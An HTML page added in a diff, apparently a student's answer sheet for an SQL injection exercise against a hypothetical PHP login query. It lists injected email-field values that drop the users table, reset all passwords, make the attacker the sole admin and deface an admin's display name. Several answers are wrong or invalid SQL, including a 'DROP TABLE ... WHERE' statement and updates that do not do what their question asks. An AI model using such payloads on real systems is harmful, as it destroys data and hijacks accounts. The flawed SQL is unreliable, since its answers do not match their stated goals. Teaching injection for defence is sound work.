@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SQL Attack</title>
+</head>
+<style>
+    * {
+        margin: 10 auto;
+    }
+    .title {
+        color:orange;
+    }
+    h3 {
+        color: red;
+    }
+    p {
+        font-size: 20px;
+    }
+    .wrapper {
+        margin: 10px 200px 10px 200px;
+    }
+</style>
+<body>
+    <div class="wrapper">
+        <h1 class="title">SQL Attack</h1>
+        <p>Imagine that a website had a simple login and in its controller,
+            all the post information was passed to the model such as follows:</p>
+        <h2 style="color: blue;">function ...($post) {
+            $this->db->query("SELECT * FROM users WHERE email = '{$post['email']}');
+            ...
+            }</h2>
+
+        <p>For the purpose of this assignment, assume that there was no validation and the
+            query was run for whatever email address the user specified in the login page.
+            Also imagine that you knew that you were user id = 135.</p>
+
+        <h2 style="color: green;">What would you enter in the email address field to:</h2>
+
+        <h2>1. Drop the entire users table?</h2>
+        <h3>email = 'x'; DROP TABLE users; --';</h3>
+
+        <h2>2. Update everyone's password to your password (allowing you to login to anyone's account using your password)</h2>
+        <h3>email = 'x'; UPDATE users
+            SET password = 'my_own_password'
+            WHERE user_id != '135';</h3>
+
+        <h2>3. Update your first_name to be the email and password of all users who is an admin
+            (assume that there is a field in the users table called is_admin where it's 0 if the user is not an admin, or 1 if the user is an admin).
+            This way, when you log out and log back in, instead of saying Welcome [your first_name], it would say Welcome ___what ever was stored in first_name field___. </h2>
+        <h3>email = 'x'; UPDATE users
+            SET email = 'my_first_name' , password = 'my_first_name'
+            WHERE is_admin = '1';</h3>
+
+        <h2>4. Update your user access so that you now have an admin access.</h2>
+        <h3>email = 'x'; UPDATE users
+            SET is_admin = '1'
+            WHERE user_id = '135';</h3>
+
+        <h2>5. Update all the user access of the admin so that they are no longer admin
+            (this way, you are now the only one having admin access and you can threaten the site users).</h2>
+        <h3>email = 'x'; UPDATE users
+            SET is_admin = '0'
+            WHERE user_id != '135';</h3>
+            
+        <h2>6. Update your first_name to now contain all the field names available in the users table
+            (to see if. there are other sensitive information you can hack).</h2>
+        <h3>email = 'x'; UPDATE users
+            SET first_name = 'my_first_nam'
+            WHERE user_id != '135';</h3>
+            
+        <h2>7.Update the first_name of user id = 1 who is an admin to 'You have been hacked!'.
+            When this user logs in, instead of saying Welcome [first_name]. It would say, "Welcome You have been hacked!".</h2>
+        <h3>email = 'x'; UPDATE users
+            SET first_name = 'You have been hacked!'
+            WHERE user_id = '1';</h3>
+
+        <h2>8. Delete all users except yourself</h2>
+        <h3>email = 'x'; DROP TABLE users WHERE user_id != '135'; --';</h3>
+    </div>    
+</body>
+
+</html>
